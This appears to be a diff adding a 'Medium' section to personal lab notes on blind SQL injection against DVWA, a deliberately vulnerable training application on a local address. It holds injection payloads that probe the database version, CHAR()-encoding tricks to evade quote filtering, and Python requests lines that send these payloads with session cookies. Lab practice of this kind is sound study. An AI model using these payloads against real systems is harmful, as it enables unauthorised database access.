@@ -73,3 +73,21 @@ http://192.168.0.105/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#
 1' AND "10.4.17"=@@VERSION;-- -
 
 
+#### Medium
+
+CONCAT(CHAR(75),CHAR(76),CHAR(77))
+
+1 AND LOCATE(CONCAT(CHAR(77)),@@VERSION);-- -   -> True
+
+
+
+",".join(["CHAR("+str(ord(char))+")" for char in "MARIA"])
+
+(VERSION + char)
+
+",".join(["CHAR("+str(ord(el))+")" for el in (VERSION + char) ])
+
+
+response = requests.post(URL, params={'id':"1 AND LOCATE(CONCAT(" + ','.join(['CHAR('+str(ord(el))+')' for el in 'M' ]) + "),@@VERSION);-- -", "Submit":"Submit"}, cookies=COOKIES)
+
+response = requests.post(URL, params={'id':"1 AND LOCATE(CONCAT(" + ','.join(["CHAR("+str(ord(el))+")" for el in ('!') ]) + "),@@VERSION);-- -", "Submit":"Submit"}, cookies=COOKIES)
